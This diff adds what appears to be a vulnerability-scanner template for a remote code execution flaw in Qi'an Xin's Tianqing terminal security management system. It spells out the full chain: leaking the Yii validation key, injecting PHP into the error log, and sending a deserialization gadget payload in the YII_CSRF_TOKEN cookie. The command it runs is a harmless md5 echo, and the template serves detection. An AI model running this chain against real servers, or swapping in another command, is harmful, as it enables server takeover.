@@ -1,0 +1,49 @@
+id: CVD-2023-2433
+
+info:
+  name: Tianqing Terminal Security Management System YII_CSRF_TOKEN Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The web part of Qi'an Xintianqing terminal security management system uses the Yii framework. This version of the framework has its own deserialization entry point, and the attacker can execute arbitrary code to obtain server permissions.
+  reference:
+    - https://www.qianxin.com
+
+variables:
+  cmd: "echo md5(233)"
+
+http:
+  - raw:
+      - |
+        GET /runtime/state.bin HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: validation_key
+        internal: true
+        part: body
+        regex:
+          - "Yii.CSecurityManager.validationkey\";s:32:\"(.*?)\";}"
+
+  - raw:
+      - |
+        GET /%3Cscript+language=%22php%22%3E{{cmd}};%3C/script%3E HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /login?refer=%2F HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: YII_CSRF_TOKEN={{validation_key}}O%3A24%3A%22Smarty_Internal_Template%22%3A1%3A%7Bs%3A6%3A%22smarty%22%3BO%3A10%3A%22CWebModule%22%3A2%3A%7Bs%3A20%3A%22%00CModule%00_components%22%3Ba%3A0%3A%7B%7Ds%3A25%3A%22%00CModule%00_componentConfig%22%3Ba%3A1%3A%7Bs%3A13%3A%22cache_locking%22%3Ba%3A4%3A%7Bs%3A5%3A%22class%22%3Bs%3A11%3A%22CUrlManager%22%3Bs%3A12%3A%22urlRuleClass%22%3Bs%3A14%3A%22CConfiguration%22%3Bs%3A5%3A%22rules%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A21%3A%22..%2Fwww%2Flogs%2Ferror.log%22%3B%7Ds%3A9%3A%22UrlFormat%22%3Bs%3A4%3A%22path%22%3B%7D%7D%7D%7D
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+      - type: word
+        part: body
+        words:
+          - "exception.CHttpException"
